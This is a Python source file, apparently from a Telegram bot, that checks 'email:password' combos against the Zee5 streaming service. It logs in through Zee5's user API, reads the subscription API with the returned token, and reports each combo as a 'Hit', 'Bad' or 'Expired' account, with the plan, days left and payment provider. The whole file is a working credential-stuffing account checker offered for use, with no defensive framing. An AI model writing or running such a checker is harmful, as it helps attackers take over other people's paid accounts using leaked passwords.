import requests
from message import logger, Sendmessage, Editmessage
from datetime import date

head = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
    'accept': 'application/json',
    'content-type': 'application/json',
}

def zee_helper(chat_id, combo):
    status = Sendmessage(chat_id, '<i>Checking....</i>')
    try:
        combo_split = combo.split(':')
        inpumail = combo_split[0]
        inpupass = combo_split[1]
    except IndexError:
        Editmessage(chat_id, 'Enter Valid Combo😡😡', status)
        return
    session_requests = requests.session()
    email= f'"email": "{inpumail}"'
    password = f'"password":"{inpupass}"'
    payload = '{%s,%s}' %(email, password)
    login_url = "https://userapi.zee5.com/v2/user/loginemail"
    result = session_requests.post(login_url, data=payload, headers=head)
    response = result.json()
    if result.status_code != 200:
        logger.info('Login Failed')
        code = response['code']
        msg = response['message']
        text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Error\nCode: {code}\nMessage: {msg}\nSite: Zee5</b>'
        Editmessage(chat_id, text, status)
        return
    acess = response['access_token']
    head2 = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
        'accept': '*/*',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'authorization': 'bearer '+str(acess),
    }
    subs_url = 'https://subscriptionapi.zee5.com/v1/subscription?translation=en&country=IN&include_all=flase'
    response1 = session_requests.get(subs_url, headers=head2)
    result1 = response1.json()
    # print(result1)
    if result1 == []:
        expire_text = f'<b>Expired Combo ❌</b>\n<b>Site: Zee5</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Expired</b>'
        Editmessage(chat_id, expire_text, status)
        return
    timedioint = result1[0]["subscription_end"].split('T')[0]
    sub2split = timedioint.split('-')
    trial = date(int(sub2split[0]), int(sub2split[1]), int(sub2split[2])) - date.today()
    Pack_name = result1[0]['subscription_plan']['title'] + ' ' + str(result1[0]['subscription_plan']['price'])
    Pack_recur = result1[0]['recurring_enabled']
    Pack_pyed = result1[0]['payment_provider']
    pro_message = f'<b>🌟 Hit Combo 💫</b>\n<b>Site: Zee5</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Premium\nPlan: {Pack_name}\nDays Left: {trial.days} Days\nPayment: {Pack_pyed}\nRecurring: {Pack_recur}</b>'
    # print(pro_message)
    Editmessage(chat_id, pro_message, status)